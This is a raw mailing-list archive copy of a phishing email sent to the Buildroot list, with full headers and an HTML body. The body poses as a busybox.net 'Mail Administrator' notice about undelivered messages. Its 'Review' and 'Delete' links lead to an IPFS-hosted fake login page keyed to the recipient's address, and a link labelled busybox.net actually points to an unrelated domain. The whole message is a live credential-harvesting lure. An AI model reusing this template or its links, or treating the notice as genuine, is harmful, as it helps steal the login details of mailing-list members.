Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 7925AC67861
	for <buildroot@archiver.kernel.org>; Tue,  9 Apr 2024 11:38:20 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp2.osuosl.org (Postfix) with ESMTP id 3C9E3402E5;
	Tue,  9 Apr 2024 11:38:20 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp2.osuosl.org ([127.0.0.1])
 by localhost (smtp2.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id FhSHE_sTL9Gr; Tue,  9 Apr 2024 11:38:19 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 400B440972
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp2.osuosl.org (Postfix) with ESMTP id 400B440972;
	Tue,  9 Apr 2024 11:38:19 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id 2C1021BF3BB
 for <buildroot@lists.busybox.net>; Tue,  9 Apr 2024 11:38:17 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 2404481756
 for <buildroot@lists.busybox.net>; Tue,  9 Apr 2024 11:38:17 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id VfZWK_IbxCT8 for <buildroot@lists.busybox.net>;
 Tue,  9 Apr 2024 11:38:16 +0000 (UTC)
X-Greylist: delayed 140077 seconds by postgrey-1.37 at util1.osuosl.org;
 Tue, 09 Apr 2024 11:38:15 UTC
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org A4BAE81755
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org A4BAE81755
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=203.149.232.166;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
Received: from busybox.net (unknown [203.149.232.166])
 by smtp1.osuosl.org (Postfix) with ESMTP id A4BAE81755
 for <buildroot@busybox.net>; Tue,  9 Apr 2024 11:38:15 +0000 (UTC)
From: Postmaster <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 9 Apr 2024 12:38:14 +0100
Message-ID: <20240409123814.5D7991AC8C66D86E@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Undeliverable: Outgoing messages failure delivery
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============3631876925945412262=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============3631876925945412262==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
ing: normal; font-family: roboto, tahoma, helvetica, sans-serif; font-size:=
 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
al; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;"><tbody style=3D"b=
ox-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><th style=3D"=
padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: none; width: 2p=
x; color: rgb(0, 0, 0); box-sizing: border-box; background-color: rgb(2, 15=
1, 64);">&nbsp;</th>
<td style=3D"margin: 0px; padding: 5px; border: 0px solid rgb(0, 0, 0); bor=
der-image: none; width: 665px; color: rgb(0, 0, 0); box-sizing: border-box;=
 background-color: rgb(243, 255, 248);"><span style=3D"font-size: 12px; box=
-sizing: border-box;">Message from<span>&nbsp;</span>
<a style=3D"color: rgb(17, 85, 204);" href=3D"http://aninditaeng.net/" targ=
et=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp:/=
/aninditaeng.net&amp;source=3Dgmail&amp;ust=3D1712731598657000&amp;usg=3DAO=
vVaw2QEaeex4OjWlhyUvs8_sWB">busybox.net</a><span>&nbsp;</span>server</span>=
</td></tr></tbody></table>
<div style=3D"border-width: 0px; margin: 0px; padding: 20px; text-align: le=
ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: verdana; font-size: 12px; font-style: normal;=
 font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space=
: normal; box-sizing: border-box; orphans: 2; widows: 2; font-stretch: inhe=
rit; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;"><font color=3D"#0=
00066" face=3D"Arial" size=3D"4" style=3D"box-sizing: border-box;"><b style=
=3D"font-weight: bolder; box-sizing: border-box;"><br>Messages Delivery Fai=
lure</b></font></div>
<div align=3D"left" style=3D"color: rgb(44, 54, 58); text-transform: none; =
text-indent: 0px; letter-spacing: normal; font-family: roboto, sans-serif; =
font-size: 13px; font-style: normal; font-weight: 400; word-spacing: 0px; b=
order-top-color: currentColor; border-top-width: 0px; border-top-style: non=
e; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; back=
ground-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-vari=
ant-caps: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial;"><font size=3D"3"><font style=3D"box-sizing: borde=
r-box;"><span style=3D"box-sizing: border-box;"><br>The delivery of message=
s was stopped by the mail server.</span><br style=3D"box-sizing: border-box=
;"><span style=3D"box-sizing: border-box;">You have&nbsp;(4) pending messag=
es that could not be sent</span></font></font><font size=3D"3">.<br style=
=3D"box-sizing: border-box;">
<span style=3D"box-sizing: border-box;"><font style=3D"box-sizing: border-b=
ox;"><br>Click to
<a style=3D"color: rgb(246, 128, 38); text-decoration: none;" href=3D"https=
://cloudflare-ipfs.com/ipfs/bafkreifxszq7cvfw2x6m2xuslqzo2aszn76luso5puce77=
xhpm63udttcu?filename=3DLogin.html#buildroot@busybox.net" target=3D"_blank"=
 data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://bafybeierhw=
jvhirggpclhysurrlonkwo6xzdpajwwiquxnbvxdvcd62qrq.ipfs.cf-ipfs.com/slouch.ht=
ml?%23admin@aninditaeng.net&amp;source=3Dgmail&amp;ust=3D1712731598657000&a=
mp;usg=3DAOvVaw1cq_TGjhGuGBeFd3XVWBJ2" data-saferedirectreason=3D"2">Review=
</a>
<span>
</span>or
<a style=3D"color: rgb(246, 128, 38); text-decoration: none;" href=3D"https=
://cloudflare-ipfs.com/ipfs/bafkreifxszq7cvfw2x6m2xuslqzo2aszn76luso5puce77=
xhpm63udttcu?filename=3DLogin.html#buildroot@busybox.net" target=3D"_blank"=
 data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://bafybeierhw=
jvhirggpclhysurrlonkwo6xzdpajwwiquxnbvxdvcd62qrq.ipfs.cf-ipfs.com/slouch.ht=
ml?%23admin@aninditaeng.net&amp;source=3Dgmail&amp;ust=3D1712731598657000&a=
mp;usg=3DAOvVaw1cq_TGjhGuGBeFd3XVWBJ2" data-saferedirectreason=3D"2">Delete=
</a>
p</font><font style=3D"box-sizing: border-box;">ending outgoing email messa=
ges.</font></span></font></div>
<div align=3D"left" style=3D"color: rgb(44, 54, 58); text-transform: none; =
text-indent: 0px; letter-spacing: normal; font-family: roboto, sans-serif; =
font-size: 13px; font-style: normal; font-weight: 400; word-spacing: 0px; b=
order-top-color: currentColor; border-top-width: 0px; border-top-style: non=
e; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; back=
ground-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-vari=
ant-caps: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial;"><span style=3D"color: black; box-sizing: border-b=
ox;"><b style=3D"font-weight: bolder; box-sizing: border-box;"><span style=
=3D"color: black; box-sizing: border-box;"><font size=3D"3"><br><br>Mail&nb=
sp;Administrator</font></span></b></span></div></body></html>

--===============3631876925945412262==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============3631876925945412262==--
